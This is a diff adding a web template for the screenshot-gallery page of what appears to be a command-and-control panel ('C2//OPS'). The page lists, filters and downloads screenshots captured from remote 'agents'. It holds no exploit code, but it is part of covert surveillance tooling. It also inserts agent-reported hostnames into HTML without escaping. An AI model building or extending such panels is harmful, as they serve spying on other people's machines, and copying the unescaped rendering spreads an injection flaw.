@@ -1,0 +1,133 @@
+{% extends 'base.html' %}
+{% set active_page = 'gallery' %}
+{% block title %}Gallery — C2//OPS{% endblock %}
+
+{% block extra_style %}
+  .gallery-page { padding: 24px; max-width: 1400px; margin: 0 auto; }
+  .gallery-hdr  { display: flex; align-items: center; justify-content: space-between; margin-bottom: 20px; }
+  .page-title   { font-family: var(--font-mono); font-size: 1rem; font-weight: 700; color: var(--green); }
+  .page-sub     { font-size: .8rem; color: var(--muted); margin-top: 3px; }
+  .filter-bar   { display: flex; gap: 8px; align-items: center; }
+  .filter-select{ background: var(--surface); border: 1px solid var(--border); border-radius: 4px; padding: 6px 10px; color: var(--text); font-family: var(--font-mono); font-size: .75rem; outline: none; }
+  .refresh-btn  { font-family: var(--font-mono); font-size: .72rem; background: none; border: 1px solid var(--border); border-radius: 4px; color: var(--muted); padding: 6px 12px; cursor: pointer; }
+  .refresh-btn:hover { color: var(--green); border-color: var(--green); }
+
+  .gallery-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 16px; }
+  .ss-card { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; overflow: hidden; cursor: pointer; transition: border-color .15s; }
+  .ss-card:hover { border-color: var(--cyan); }
+  .ss-thumb { width: 100%; height: 200px; object-fit: cover; display: block; background: var(--bg); }
+  .ss-meta  { padding: 10px 14px; display: flex; justify-content: space-between; align-items: center; }
+  .ss-host  { font-family: var(--font-mono); font-size: .8rem; color: var(--text); font-weight: 600; }
+  .ss-time  { font-family: var(--font-mono); font-size: .68rem; color: var(--muted); }
+  .ss-dl    { font-family: var(--font-mono); font-size: .68rem; color: var(--cyan); text-decoration: none; padding: 3px 8px; border: 1px solid rgba(0,212,255,.3); border-radius: 3px; }
+  .ss-dl:hover { background: rgba(0,212,255,.08); }
+
+  .empty-gallery { text-align: center; padding: 80px 20px; color: var(--muted); }
+  .empty-gallery .icon { font-size: 3rem; opacity: .2; margin-bottom: 12px; }
+  .empty-gallery p { font-family: var(--font-mono); font-size: .85rem; }
+
+  /* lightbox */
+  .lightbox { display: none; position: fixed; inset: 0; background: rgba(0,0,0,.88); z-index: 1000; align-items: center; justify-content: center; }
+  .lightbox.open { display: flex; }
+  .lb-inner { position: relative; max-width: 95vw; max-height: 90vh; }
+  .lb-img   { max-width: 95vw; max-height: 90vh; border: 1px solid var(--border); border-radius: 4px; display: block; }
+  .lb-close { position: absolute; top: -36px; right: 0; font-family: var(--font-mono); color: var(--muted); cursor: pointer; font-size: .85rem; }
+  .lb-close:hover { color: var(--red); }
+  .lb-meta  { position: absolute; bottom: -28px; left: 0; font-family: var(--font-mono); font-size: .72rem; color: var(--muted); }
+{% endblock %}
+
+{% block content %}
+<div class="gallery-page">
+  <div class="gallery-hdr">
+    <div>
+      <div class="page-title">// Screenshot Gallery</div>
+      <div class="page-sub">All screenshots captured across active sessions</div>
+    </div>
+    <div class="filter-bar">
+      <select class="filter-select" id="agent-filter" onchange="applyFilter()">
+        <option value="">All agents</option>
+      </select>
+      <button class="refresh-btn" onclick="loadScreenshots()">↻ Refresh</button>
+    </div>
+  </div>
+
+  <div class="gallery-grid" id="gallery-grid">
+    <div class="empty-gallery" style="grid-column:1/-1">
+      <div class="icon">🖼</div>
+      <p>Loading screenshots...</p>
+    </div>
+  </div>
+</div>
+
+<!-- Lightbox -->
+<div class="lightbox" id="lightbox" onclick="closeLightbox()">
+  <div class="lb-inner" onclick="event.stopPropagation()">
+    <div class="lb-close" onclick="closeLightbox()">[ close ]</div>
+    <img class="lb-img" id="lb-img" src="" alt="screenshot"/>
+    <div class="lb-meta" id="lb-meta"></div>
+  </div>
+</div>
+{% endblock %}
+
+{% block extra_script %}
+  let allShots = [];
+
+  async function loadScreenshots() {
+    try {
+      allShots = await (await fetch('/api/screenshots')).json();
+      populateFilter();
+      applyFilter();
+    } catch { renderEmpty('Failed to load screenshots.'); }
+  }
+
+  function populateFilter() {
+    const hosts = [...new Set(allShots.map(s => s.hostname))];
+    const sel   = document.getElementById('agent-filter');
+    sel.innerHTML = '<option value="">All agents</option>' +
+      hosts.map(h => `<option value="${h}">${h}</option>`).join('');
+  }
+
+  function applyFilter() {
+    const host = document.getElementById('agent-filter').value;
+    const shots = host ? allShots.filter(s => s.hostname === host) : allShots;
+    renderGrid(shots);
+  }
+
+  function renderGrid(shots) {
+    const grid = document.getElementById('gallery-grid');
+    if (!shots.length) { renderEmpty('No screenshots captured yet. Run the <code>screenshot</code> command on an active agent.'); return; }
+    grid.innerHTML = shots.map((s, i) => `
+      <div class="ss-card" onclick="openLightbox(${i})">
+        <img class="ss-thumb" src="data:image/png;base64,${s.b64}" alt="screenshot from ${s.hostname}" loading="lazy"/>
+        <div class="ss-meta">
+          <div>
+            <div class="ss-host">${s.hostname}</div>
+            <div class="ss-time">${new Date(s.taken_at+'Z').toLocaleString()}</div>
+          </div>
+          <a class="ss-dl" href="data:image/png;base64,${s.b64}" download="ss_${s.hostname}_${s.id.slice(0,8)}.png" onclick="event.stopPropagation()">↓ save</a>
+        </div>
+      </div>`).join('');
+  }
+
+  function renderEmpty(msg) {
+    document.getElementById('gallery-grid').innerHTML =
+      `<div class="empty-gallery" style="grid-column:1/-1"><div class="icon">🖼</div><p>${msg}</p></div>`;
+  }
+
+  function openLightbox(i) {
+    const filtered = document.getElementById('agent-filter').value
+      ? allShots.filter(s => s.hostname === document.getElementById('agent-filter').value)
+      : allShots;
+    const s = filtered[i];
+    document.getElementById('lb-img').src  = `data:image/png;base64,${s.b64}`;
+    document.getElementById('lb-meta').textContent = `${s.hostname} — ${new Date(s.taken_at+'Z').toLocaleString()}`;
+    document.getElementById('lightbox').classList.add('open');
+  }
+
+  function closeLightbox() { document.getElementById('lightbox').classList.remove('open'); }
+
+  document.addEventListener('keydown', e => { if (e.key==='Escape') closeLightbox(); });
+
+  loadScreenshots();
+  setInterval(loadScreenshots, 30000);
+{% endblock %}
